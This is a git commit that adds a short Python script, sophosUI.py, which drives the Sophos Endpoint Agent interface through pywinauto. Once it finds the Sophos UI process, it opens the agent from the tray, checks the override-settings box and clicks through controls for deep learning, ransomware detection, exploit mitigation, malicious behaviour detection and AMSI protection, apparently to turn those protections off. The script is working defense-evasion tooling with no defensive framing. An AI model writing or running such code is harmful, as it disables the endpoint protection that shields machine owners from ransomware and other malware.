07a9ee73e209a406331e70353888d01f64bb657e
spence-rat <82817752+spence-rat@users.noreply.github.com>
2022-04-12 22:27:39 +0000

    Add files via upload

---
+++ sophosUI.py
@@ -0,0 +1,42 @@
+import psutil
+from pywinauto import Application, Desktop
+import time
+
+
+
+def returnPID(process):
+    process_name = process
+    processID = None
+    for proc in psutil.process_iter():
+        if process_name in proc.name():
+            processID = proc.pid
+            return (processID)
+
+def processRunCheck(processname):
+    for proc in psutil.process_iter():
+        try:
+            if processname.lower() in proc.name().lower():
+                return True
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                pass
+    return False;
+
+sophosUI = returnPID("Sophos UI.exe")
+
+def SophosUI():
+    app = Application(backend="uia").connect(path="explorer.exe")
+    sys_tray = app.window(class_name="Shell_TrayWnd")
+    sys_tray.child_window(title='Sophos Endpoint Agent').click_input(double=True)
+    app = Application(backend="uia").connect(process=sophosUI, visible_only=False)
+    dlg = app['Sophos Endpoint Agent']
+    #dlg.print_control_identifiers()
+    dlg['SettingsRadioButton'].click_input()
+    time.sleep(3)
+    dlg.child_window(auto_id="OverrideSettingsCheckBox", control_type="CheckBox").click_input()
+    dlg.child_window(auto_id="Enable Deep Learning", control_type="Button").click_input()
+    dlg.child_window(auto_id="Ransomware Detection", control_type="Button").click_input()
+    dlg.child_window(auto_id="Exploit Mitigation", control_type="Button").click_input()
+    dlg.child_window(auto_id="Malicious Behavior Detection", control_type="Button").click_input()
+    dlg.child_window(auto_id="AMSI Protection", control_type="Button").click_input()
+
+SophosUI()
